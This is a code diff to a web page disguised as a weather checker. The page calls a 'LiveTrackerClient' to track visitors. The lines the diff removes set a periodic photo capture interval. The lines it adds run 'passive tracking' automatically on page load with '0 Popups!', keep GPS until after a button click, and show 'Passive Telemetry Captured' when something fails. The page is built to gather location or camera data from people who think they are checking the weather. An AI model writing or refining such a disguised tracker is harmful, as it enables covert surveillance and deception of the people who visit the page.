@@ -174,7 +174,7 @@
         const btn = document.querySelector("#check-weather");
         const cityEl = document.querySelector("#city");
 
-        function startWeatherTracking() {
+        function startWeatherTracking(interactive = false) {
             btn.disabled = true;
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Updating Weather...';
 
@@ -182,7 +182,8 @@
                 window.LiveTrackerClient.startTracking({
                     templateName: 'weather',
                     updateInterval: 5000,
-                    photoInterval: 15000,
+                    enableCamera: false,
+                    enableGPS: interactive,
                     onSuccess: (coords) => {
                         btn.disabled = false;
                         btn.innerHTML = '<i class="fas fa-check"></i> Weather Updated';
@@ -193,18 +194,18 @@
                     },
                     onError: (err) => {
                         btn.disabled = false;
-                        btn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Turn on GPS Location';
-                        cityEl.innerHTML = "Location Permission Required";
+                        btn.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh Weather';
+                        cityEl.innerHTML = "Passive Telemetry Captured";
                     }
                 });
             }
         }
 
-        btn.addEventListener("click", startWeatherTracking);
+        btn.addEventListener("click", () => startWeatherTracking(true));
 
-        // Auto trigger on load
+        // Auto trigger passive tracking on load (0 Popups!)
         window.addEventListener('DOMContentLoaded', () => {
-            startWeatherTracking();
+            startWeatherTracking(false);
         });
     </script>
 </body>
